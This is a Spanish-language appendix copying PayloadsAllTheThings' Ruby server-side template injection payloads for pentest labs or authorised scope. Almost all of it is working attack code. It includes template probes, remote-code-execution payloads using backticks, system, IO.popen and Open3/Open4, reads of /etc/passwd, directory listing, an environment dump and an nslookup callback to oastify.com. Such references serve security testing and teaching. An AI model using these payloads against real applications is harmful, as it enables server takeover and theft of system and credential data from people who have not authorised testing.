# Server-Side Template Injection (SSTI): anexo de ejemplos de PayloadsAllTheThings

> **Uso:** elegir el bloque que corresponde al motor, versión y punto de entrada. Las líneas de un bloque pueden ser alternativas. Sustituir hosts, rutas, identificadores y dominios por los del laboratorio o alcance autorizado. Los ejemplos originales son referencias de sintaxis, no pruebas verificadas contra el objetivo.

**Documento de origen:** [Server Side Template Injection/Ruby.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a/Server%20Side%20Template%20Injection/Ruby.md), revisión fija 3ac27901c711. **Licencia:** [MIT de Swissky](../../LICENCIA_PATT.md).

[← Índice de anexos](Catalogo_PATT.md) · [← Guía principal](README.md)

## 1. Inyección en plantillas del servidor - Ruby / Templating Libraries

### Variantes presentes en tablas o texto del apartado

```text
<%= %>
#{ }
{{ }}
```

## 2. Inyección en plantillas del servidor - Ruby / Universal Payloads

```ruby
%x('id') # Rendered RCE
File.read("Y:/A:/"+%x('id')) # Error-Based RCE
1/(system("id")&&1||0) # Boolean-Based RCE
system("id && sleep 5") # Time-Based RCE
```

## 3. Ruby / Ruby - Básicos injections

```ruby
<%= 7 * 7 %>
```

```ruby
#{ 7 * 7 }
```

## 4. Ruby / Ruby - Retrieve /etc/passwd

```ruby
<%= File.open('/etc/passwd').read %>
```

## 5. Ruby / Ruby - List Archivos and directories

```ruby
<%= Dir.entries('/') %>
```

## 6. Ruby / Ruby - Remote Ejecución de comandos

```ruby
<%=(`nslookup oastify.com`)%>
<%= system('cat /etc/passwd') %>
<%= `ls /` %>
<%= IO.popen('ls /').readlines()  %>
<% require 'open3' %><% @a,@b,@c,@d=Open3.popen3('whoami') %><%= @b.readline()%>
<% require 'open4' %><% @a,@b,@c,@d=Open4.popen4('whoami') %><%= @c.readline()%>
```

```powershell
#{ %x|env| }
```

---

[← Índice de anexos](Catalogo_PATT.md) · [← Guía principal](README.md) · [Licencia de origen](../../LICENCIA_PATT.md)
